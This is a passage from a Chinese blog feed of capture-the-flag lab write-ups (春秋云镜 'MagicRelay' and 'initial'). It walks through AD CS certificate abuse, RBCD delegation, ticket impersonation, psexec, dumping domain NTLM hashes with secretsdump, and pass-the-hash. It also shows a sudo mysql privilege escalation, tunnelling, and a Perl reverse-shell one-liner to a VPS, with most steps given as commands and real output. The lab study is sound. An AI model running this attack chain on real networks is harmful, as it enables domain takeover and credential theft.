 47.113.229.136:1123  ...  172.22.12.6:88  ...  OK</span><br><span class="line">[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里报错 <code>KDC_ERR_PADATA_TYPE_NOSUPP</code> 多半时因为获取的证书没有 <code>智能卡登录</code> EKU，但这里我们可以通过<font style="color:rgb(51, 51, 51);">解决办法的话就是尝试 Schannel，通过 Schannel将证书传递到 LDAPS, 修改 LDAP 配置 (例如配置 RBCD &#x2F; DCSync), 进而获得域控权限。</font></p><h3 id="RBCD"><a href="#RBCD" class="headerlink" title="RBCD"></a>RBCD</h3><blockquote><p>参考文章</p><p><a href="https://cloud.tencent.com/developer/article/2391445">https://cloud.tencent.com/developer/article/2391445</a></p></blockquote><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/33.png"></p><p><strong>提取出密钥与证书</strong></p><hr><p><strong>有两种方法</strong></p><p><strong>使用certipy</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">certipy cert -pfx win-server.pfx -nokey -out win-server.crt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/red/redis/RedisWriteFile-master]</span><br><span class="line">└─# certipy cert -pfx win-server.pfx -nokey -out win-server.crt</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Writing certificate and  to &#x27;win-server.crt&#x27;</span><br><span class="line">                                                                                                                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/home/kali/red/redis/RedisWriteFile-master]</span><br><span class="line">└─# certipy cert -pfx win-server.pfx -nocert -out win-server.key</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Writing private key to &#x27;win-server.key&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in win-server.pfx -nodes -out win-server.pem</span><br><span class="line">openssl rsa -in win-server.pem -out win-server.key</span><br><span class="line">openssl x509 -in win-server.pem -out win-server.crt</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">接下来将证书配置到域控的</font><code>&lt;font style=&quot;color:rgb(10, 191, 91);background-color:rgb(243, 245, 249);&quot;&gt;RBCD&lt;/font&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q python3 passthecert.py -action write_rbcd -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6 -delegate-to &#x27;win-server$&#x27; -delegate-from &#x27;Hundredsu$&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 /home/kali/red/impacket-0.11.0/examples/passthecert.py -action write_rbcd -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6 -delegate-to &#x27;win-server$&#x27; -delegate-from &#x27;Hundredsu$&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/red/redis/RedisWriteFile-master]</span><br><span class="line">└─# proxychains4 -q python3 /home/kali/red/impacket-0.11.0/examples/passthecert.py -action write_rbcd -crt win-server.crt -key win-server.key -domain xiaorang.lab -dc-ip 172.22.12.6 -delegate-to &#x27;win-server$&#x27; -delegate-from &#x27;Hundredsu$&#x27;</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class="line">[*] Delegation rights modified successfully!</span><br><span class="line">[*] Hundredsu$ can now impersonate users on win-server$ via S4U2Proxy</span><br><span class="line">[*] Accounts allowed to act on behalf of other identity:</span><br><span class="line">[*]     Hundredsu$   (S-1-5-21-3745972894-1678056601-2622918667-1106)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>申请一张cifs服务的ST</p><p><font style="color:rgb(51, 51, 51);">接下来同之前一样，申请ST，导入票据，无密码登录即可。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q impacket-getST xiaorang.lab/&#x27;Hundredsu$&#x27;:&#x27;ViKxqBEGeEwj6B03&#x27; -spn cifs/win-server.xiaorang.lab -impersonate Administrator -dc-ip 172.22.12.6</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                                                                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/home/kali/red/redis/RedisWriteFile-master]</span><br><span class="line">└─# proxychains4 -q impacket-getST xiaorang.lab/&#x27;Hundredsu$&#x27;:&#x27;ViKxqBEGeEwj6B03&#x27; -spn cifs/win-server.xiaorang.lab -impersonate Administrator -dc-ip 172.22.12.6</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT for user</span><br><span class="line">[*] Impersonating Administrator</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[*] Saving ticket in Administrator.ccache</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>导入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator.ccache</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/red/redis/RedisWriteFile-master]</span><br><span class="line">└─# export KRB5CCNAME=Administrator.ccache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>无密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q impacket-psexec Administrator@win-server.xiaorang.lab -k -no-pass -dc-ip 172.22.12.6 -codec gbk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/red/redis/RedisWriteFile-master]</span><br><span class="line">└─# proxychains -q impacket-psexec Administrator@win-server.xiaorang.lab -k -no-pass -dc-ip 172.22.12.6 -codec gbk</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on win-server.xiaorang.lab.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file QMjMtnXk.exe</span><br><span class="line">[*] Opening SVCManager on win-server.xiaorang.lab.....</span><br><span class="line">[*] Creating service Igqf on win-server.xiaorang.lab.....</span><br><span class="line">[*] Starting service Igqf.....</span><br><span class="line">[!] Press help for extra shell commands                                                                                                                                                                                                                                      Microsoft Windows [版本 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\windows\system32&gt; whoami                                                                                                                                                                                                                                                  nt authority\system</span><br><span class="line"></span><br><span class="line">C:\windows\system32&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\flag&gt; type flag04.txt                                                                                                                                                                                                                                  ________  _______   ___       ________      ___    ___ ___   ___  _____ ______   ________  ________  ___  ________     </span><br><span class="line">|\   __  \|\  ___ \ |\  \     |\   __  \    |\  \  /  /|\  \ |\  \|\   _ \  _   \|\   __  \|\   ____\|\  \|\   ____\    </span><br><span class="line">\ \  \|\  \ \   __/|\ \  \    \ \  \|\  \   \ \  \/  / | \  \\_\  \ \  \\\__\ \  \ \  \|\  \ \  \___|\ \  \ \  \___|    </span><br><span class="line"> \ \   _  _\ \  \_|/_\ \  \    \ \   __  \   \ \    / / \ \______  \ \  \\|__| \  \ \   __  \ \  \  __\ \  \ \  \       </span><br><span class="line">  \ \  \\  \\ \  \_|\ \ \  \____\ \  \ \  \   \/  /  /   \|_____|\  \ \  \    \ \  \ \  \ \  \ \  \|\  \ \  \ \  \____  </span><br><span class="line">   \ \__\\ _\\ \_______\ \_______\ \__\ \__\__/  / /            \ \__\ \__\    \ \__\ \__\ \__\ \_______\ \__\ \_______\</span><br><span class="line">    \|__|\|__|\|_______|\|_______|\|__|\|__|\___/ /              \|__|\|__|     \|__|\|__|\|__|\|_______|\|__|\|_______|</span><br><span class="line">                                           \|___|/                                                                      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag04: flag&#123;4c7d6e81-3161-4853-b93f-349ab74a60e5&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>导出hash</p><blockquote><p><code>ntds.dit</code> 是 <strong>Active Directory（AD）数据库文件</strong>，存储了整个域的用户账户信息，包括<strong>域管理员和所有域用户的 NTLM 哈希</strong>。<br>需要从 <code>C:\Windows\NTDS\ntds.dit</code> 提取数据，并且<strong>通常需要 <strong><code>**SYSTEM**</code></strong> 注册表文件进行解密</strong><br>一般需要有域管的权限才能导出</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-secretsdump &#x27;xiaorang.lab/administrator@win-server.xiaorang.lab&#x27; -target-ip 172.22.12.6 -no-pass -k</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/red/redis/RedisWriteFile-master]</span><br><span class="line">└─# proxychains4 impacket-secretsdump &#x27;xiaorang.lab/administrator@win-server.xiaorang.lab&#x27; -target-ip 172.22.12.6 -no-pass -k</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.12.6:445  ...  OK</span><br><span class="line">[*] Service RemoteRegistry is in stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0x3d0b51771c180c3bfcb89c8258922751</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d418e6aaeff1177bee5f84cf0466802c:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC </span><br><span class="line">XIAORANG\WIN-SERVER$:plain_password_hex:9a74bcd9ddca464b2c608c510a99ea057cc802d8eb0abb670ad7547c93f0804b374b2211f64393cd59e0c816b1b18492b04aa92dfde26ce3fef8c7787187ae94253fcbb6bcd1a1572e80a7a56368e7ecf5cdeaa60403e370350d0a6b6a05c7efe8402d3a4fbd31644da6d4d9cae5eef218086e3b0a5ef40764702282c42f2fafb284ada5b56d9925eb306fc6826db426a31754900d9937ae202c0fc40374f2d2e8ca5e397eedf93ab96780cfcc3dabfcc19780c107b443893baad328d80702f2c23d42357cd972058abd36e5abd69da6eea348474f22e35a814ff8a93e6ea0151395fbbba3b79584f2ea2c536739039c</span><br><span class="line">XIAORANG\WIN-SERVER$:aad3b435b51404eeaad3b435b51404ee:22fce7302a308a41d27d2da82b452791:::</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0x1013bf8bbf66971ac0c6c4938c9c187c859ef5b7</span><br><span class="line">dpapi_userkey:0xfd5a847b92da1e611b6a94df40e674f00b7054f8</span><br><span class="line">[*] NL$KM </span><br><span class="line"> 0000   9D 83 14 71 4B 67 2E 66  8B 36 79 E5 74 94 DF CE   ...qKg.f.6y.t...</span><br><span class="line"> 0010   F8 0F 28 EC 6A 7A 89 28  4F F7 D1 07 B7 9A B8 6E   ..(.jz.(O......n</span><br><span class="line"> 0020   14 76 A6 CC 5E 52 A4 86  86 55 3A C1 37 51 5D 87   .v..^R...U:.7Q].</span><br><span class="line"> 0030   3D 33 6E A7 45 EE 79 E8  89 60 CC A6 AA 98 58 EE   =3n.E.y..`....X.</span><br><span class="line">NL$KM:9d8314714b672e668b3679e57494dfcef80f28ec6a7a89284ff7d107b79ab86e1476a6cc5e52a48686553ac137515d873d336ea745ee79e88960cca6aa9858ee</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.12.6:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  47.113.229.136:1123  ...  172.22.12.6:49666  ...  OK</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa95e708a5182931157a526acf769b13:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a12e9453c13fc38f271f91059d9876d5:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">zhangling:1105:aad3b435b51404eeaad3b435b51404ee:07d308b46637d5a5035f1723d23dd274:::</span><br><span class="line">WIN-SERVER$:1000:aad3b435b51404eeaad3b435b51404ee:22fce7302a308a41d27d2da82b452791:::</span><br><span class="line">WIN-YUYAOX9Q$:1103:aad3b435b51404eeaad3b435b51404ee:e611213c6a712f9b18a8d056005a4f0f:::</span><br><span class="line">WIN-AUTHORITY$:1104:aad3b435b51404eeaad3b435b51404ee:cdf3827b7f17be0ba30c35fcbbed6e9f:::</span><br><span class="line">Hundredsu$:1106:aad3b435b51404eeaad3b435b51404ee:226f6d6268ffab5c7030c5ec14c8702f:::</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要看NTDS.DIT</p><p>就剩一个flag03</p><p>肯定是在ca服务器上了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa95e708a5182931157a526acf769b13</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/34.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">python D:\red\内网\免杀工具包\免杀工具包\impacket-0.12.0\examples\psexec.py xiaorang.lab/administrator@172.22.12.12  -hashes 00000000000000000000000000000000:aa95e708a5182931157a526acf769b13 -codec gbk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt; type flag03.txt</span><br><span class="line">  .-.      ___</span><br><span class="line"> /    \   (   )</span><br><span class="line"> | .`. ;   | |    .---.    .--.      .-.      .--.</span><br><span class="line"> | |(___)  | |   / .-, \  /    \   /    \   /     \</span><br><span class="line"> | |_      | |  (__) ; | ;  ,-. &#x27; |  .-. ; (___)`. |</span><br><span class="line">(   __)    | |    .&#x27;`  | | |  | | | |  | |    .-&#x27; /</span><br><span class="line"> | |       | |   / .&#x27;| | | |  | | | |  | |    &#x27;. \</span><br><span class="line"> | |       | |  | /  | | | |  | | | |  | |  ___ \ &#x27;</span><br><span class="line"> | |       | |  ; |  ; | | &#x27;  | | | &#x27;  | | (   ) ; |</span><br><span class="line"> | |       | |  &#x27; `-&#x27;  | &#x27;  `-&#x27; | &#x27;  `-&#x27; /  \ `-&#x27;  /</span><br><span class="line">(___)     (___) `.__.&#x27;_.  `.__. |  `.__,&#x27;    &#x27;,__.&#x27;</span><br><span class="line">                          ( `-&#x27; ;</span><br><span class="line">                           `.__.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag03: flag&#123;317621a6-bb66-4154-b157-365c871d52d2&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/35.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-MagicRelay/36.png"></p><p>拿下</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-initial</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<p>我们来展示一下实战攻防的场景（未授权攻击他人服务器是违法行为,请勿模仿)</p><p>获取靶机（可以理解为一家公司的四台电脑）中的三份重要文件，可以理解类似商业机密的文件</p><p>信息收集</p><p>使用fscan，综合漏洞扫描、信息收集的工具进行收集主机的信息，扩展攻击面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.99.154.105</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/1.png"></p><p>扫出thinkphp的rce</p><p>使用开发好的漏洞利用工具直接利用</p><p>使用一把梭直接梭</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/2.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/3.png"></p><p>连接成功</p><p>执行whoami、ifconfig收集内网信息</p><p>内网网段为172.22.1.0&#x2F;24</p><p>发现只是普通用户</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/4.png"></p><p>那就需要提权了</p><p>同时这台还是linux</p><p>内核容易崩，我们就先考虑suid和sudo提权</p><p>我们现在只是普通用户 需要提权到root</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/5.png"></p><p>mysql的sudo可以提权</p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>在这个网站查询一下</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/6.png"></p><p>使用以下的命令即可提权，或者是以root用户来执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#获取交互式shell</span><br><span class="line">sudo mysql -e &#x27;\! /bin/sh&#x27;</span><br><span class="line"></span><br><span class="line">#以root权限执行whoami命令（哥斯拉并不是交互式）</span><br><span class="line">sudo mysql -e &#x27;\! whoami&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/7.png"></p><p>攻击成功获取到对面的重要文件即flag01</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/8.png"></p><p>使用大文件上传fscan，综合扫描工具</p><p>还有<strong>Stowaway–隧道工具的客户端</strong></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/9.png"></p><p>这里我直接使用哥斯拉和蚁剑执行fscan进行二次收集一直不成功（这也是在我们真实攻防中经常发生的事，所以我们需要掌握多种攻击手法和多种防御手法）</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/10.png"></p><p>那我们先建立网络隧道，使得我的电脑可以直接与该服务器的内网进行网络通讯</p><p>这里我使用的是Stowaway</p><p>其还可以获取shell，同时还可以通过反弹shell使我在我的vps上可以获取交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 1080      #服务端（vps）</span><br><span class="line">./linux_x64_agent -c 47.113.229.136:1080   #客户端（靶机）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>vps</p><p>先在vps上监听</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/11.png"></p><p>靶机</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/12.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/13.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#连接后选择39.99.154.105这台机器</span><br><span class="line">use 0</span><br><span class="line">#将vps作为跳板机，在1123端口上开启socks隧道</span><br><span class="line">socks 1123</span><br><span class="line"></span><br><span class="line">#获取shell，即命令行</span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line">#编辑代理配置文件</span><br><span class="line">vim /etc/proxychains4.conf </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在windows和linux上都配置好代理，使得我们的物理机就是我们自己的电脑可以直接和这个服务器的内网的其他电脑进行通讯</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/14.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/15.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/16.png"></p><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#vps再开一个窗口监听</span><br><span class="line">nc lvvp 1133</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#靶机反弹shell命令</span><br><span class="line">perl -e&#x27;use Socket;$i=&quot;47.113.229.136&quot;;$p=1133;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">#提权</span><br><span class="line">sudo mysql -e &#x27;\! /bin/sh&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/17.png"></p><p>由于前面已经给了fscan的执行权限，这里直接执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./fscan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./fscan -h 172.22.1.0/24</span><br></pre></td></tr></table></figure><p>对内网进行信息收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.1.2</span><br><span class="line">主机名: DC01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.1.2</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.1.21</span><br><span class="line">主机名: XIAORANG-WIN7</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.1.21</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.1.18</span><br><span class="line">主机名: XIAORANG-OA01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.1.18</span><br><span class="line">[2025-04-02 18:08:54] [INFO] 系统信息 172.22.1.2 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetBios 172.22.1.2      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] 网站标题 http://172.22.1.18        状态码:302 长度:0      